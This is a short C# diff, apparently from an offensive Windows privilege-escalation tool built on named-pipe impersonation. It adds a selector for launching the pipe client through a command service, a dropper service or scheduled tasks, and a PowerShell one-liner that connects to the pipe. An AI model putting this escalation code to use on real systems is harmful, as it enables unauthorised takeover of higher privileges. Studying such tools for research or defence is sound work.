@@ -9,7 +9,12 @@ namespace NamedPipeImpersonation.Library
         public static IntPtr PipeEventHandle { get; set; } = IntPtr.Zero;
         public static string ServiceName { get; } = "PrivFuPipeSvc";
         public static int Timeout { get; set; } = 3000;
-        public static bool UseDropper { get; set; } = false;
+        // 0: Command Service, 1: Dropper Service, 2: Scheduled Tasks
+        public static uint MethodId { get; set; } = 0;
+        public static string PoshTemplate { get; } =
+            "$c = [System.IO.Pipes.NamedPipeClientStream]::" + 
+            "new(\".\", \"{0}\", [System.IO.Pipes.PipeDirection]::Out); " +
+            "$c.Connect(3000); $c.Write(@(0x00), 0, 1); $c.Dispose()";
 
         /*
          * Raw Bytes of NamedPipeClient binary
